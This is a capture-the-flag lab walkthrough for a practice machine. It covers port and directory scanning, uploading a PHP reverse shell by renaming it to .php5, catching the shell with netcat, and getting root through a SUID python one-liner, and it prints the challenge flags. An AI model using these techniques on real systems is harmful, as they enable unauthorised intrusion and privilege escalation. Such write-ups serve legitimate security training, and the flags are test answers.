---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Task 1: Deploy the machine
### Deploy the machine
### No answer needed

## Task 2: Reconnaissance
### Scan the machine, how many ports are open?
- Let's run a `nmap` scan to see which ports are open.
```
$ nmap -sC -sV 10.10.216.90
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-12 19:05 IST
Nmap scan report for 10.10.216.90
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.85 seconds
```
- As we can see there are two open ports:

| Port | Service | 
|--|--|
| 22 | ssh |
| 80 | http |

### Answer
```
2
```

&nbsp;

### What version of Apache is running?
### Answer
```
2.4.29
```

&nbsp;

### What service is running on port 22?
### Answer
```
SSH
```

&nbsp;

### Find directories on the web server using the GoBuster tool.
- We can find directories with the following command:
```
$ gobuster dir -u http://10.10.216.90 -w /usr/share/wordlists/dirb/small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.216.90
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 310] [--> http://10.10.216.90/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.216.90/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.216.90/panel/]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.216.90/uploads/]
Progress: 959 / 960 (99.90%)
===============================================================
Finished
===============================================================
```

&nbsp;

### What is the hidden directory?
## Answer
```
/panel/
```

&nbsp;

## Task 3: Getting a shell
### 
user.txt
- In order to get a reverse shell, we have to first go to the `/panel` directory.

![2](https://github.com/Knign/Write-ups/assets/110326359/9223280c-9bec-46ec-b9f5-bff70cae9dc9)

- There are multiple ways of obtaining a reverse shell. We will be using a `php` reverse shell.
- We will be using the `/usr/share/webshells/php/php-reverse-shell.php` script after making some modifications.

![4](https://github.com/Knign/Write-ups/assets/110326359/98dbb607-a647-4217-9276-a71d7f4ff7bb)

- We have to replace the IP address with our own IP address which we can find using the `ip` command. We can also change the port to any particular port we want like `9999`.
```
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:9f:ce:18 brd ff:ff:ff:ff:ff:ff
    inet 10.0.4.6/24 brd 10.0.4.255 scope global dynamic noprefixroute eth0
       valid_lft 332sec preferred_lft 332sec
    inet6 fe80::a00:27ff:fe9f:ce18/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.17.48.138/17 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::691d:5bb7:720:68ac/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```
- Once we have replaced the IP address we are ready to upload our `php-reverse-shell.php` file.

![5](https://github.com/Knign/Write-ups/assets/110326359/36310b86-eae0-4c13-baf4-ae487c7e0973)

- Let's click on the `Upload` button next.

![6](https://github.com/Knign/Write-ups/assets/110326359/42007f78-ae9f-4d1a-b364-c36ce5d90638)

- Looks like `php` is not allowed.
- There is a workaround for this, we can try to change the file extension to `php5` to see if that is allowed.

![7](https://github.com/Knign/Write-ups/assets/110326359/a4695556-b2c4-4571-9c78-8eaa9127299a)

- Let's hit `Upload`.

![8](https://github.com/Knign/Write-ups/assets/110326359/5417e512-5007-4fd1-baeb-0e3c4f8b0f7e)

- Our file upload has been successful.
- We can now use `netcat` to listen for requests.
```
$ nc -nlvp 9999
```
- Next, let's go to the `/uploads` folder.

![9](https://github.com/Knign/Write-ups/assets/110326359/b1937f83-05b8-468b-b4de-7fd4dd682daf)

- On clicking on the `php-reverse-shell.php5` link, a request will be sent to our IP address on the `9999` port which will be caught by our `netcat` listener.
```
$ nc -nlvp 9999                                  
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.216.90] 44132
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:26:08 up 54 min,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
- We have our reverse shell.
- Let's find the `user.txt` file using the `find` command.
```
$ find / -name user.txt 2>/dev/null  
/var/www/user.txt
```
- Now we simply have to `cat` the file.
```
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```
### Answer
```
THM{y0u_g0t_a_sh3ll}
```

&nbsp;

## Task 4: Privilege escalation
### Search for files with SUID permission, which file is weird?
- Again, we can use the `find` command to find the relevant file.
```
$ find / -perm -u=s 2>/dev/null  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```
- Out of all the binaries with the SUID bit set, the `/usr/bin/python` binary is the most unusual.
### Answer
```
/usr/bin/python
```

&nbsp;

### Find a form to escalate your privileges.
- We will be using the `python` utility to escalate our privilege since it already has the SUID bit set.
- But before we do that, we need to check out GTFObins for a shell script.

![10](https://github.com/Knign/Write-ups/assets/110326359/ac92d807-5b9d-40cc-8d37-9f917357a732)

- We have to use the selected script with the `/usr/bin/python` interpreter.
```
$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
```
- We have successfully escalated our privilege to `root`.
### No answer needed

&nbsp;

### root.txt
- Let's find the `root.txt` file.
```
find / -name root.txt 2>/dev/null 
/root/root.txt
```
- All we have to do now is `cat` the file.
```
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
### Answer
```
THM{pr1v1l3g3_3sc4l4t10n}
```
